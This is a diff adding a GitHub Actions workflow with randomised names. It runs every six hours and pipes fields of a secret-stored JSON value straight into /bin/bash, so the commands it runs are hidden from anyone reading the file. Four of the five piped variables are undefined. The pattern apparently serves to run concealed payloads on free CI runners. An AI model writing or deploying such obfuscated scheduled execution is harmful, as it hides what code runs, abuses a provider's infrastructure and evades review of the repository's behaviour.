@@ -1,0 +1,21 @@
+name: haoqilou6154
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoqilou6154
+        env:
+          cyhw10: ${{ secrets.cyhw10 }}
+        run: |
+          echo $cyhw10 | jq -r .z47376 | /bin/bash
+          echo $l54188 | jq -r .fuxzb57736 | /bin/bash
+          echo $gduz370 | jq -r .ycsq20355 | /bin/bash
+          echo $mwj81376 | jq -r .dcp7794 | /bin/bash
+          echo $u5 | jq -r .ubv7522 | /bin/bash
+
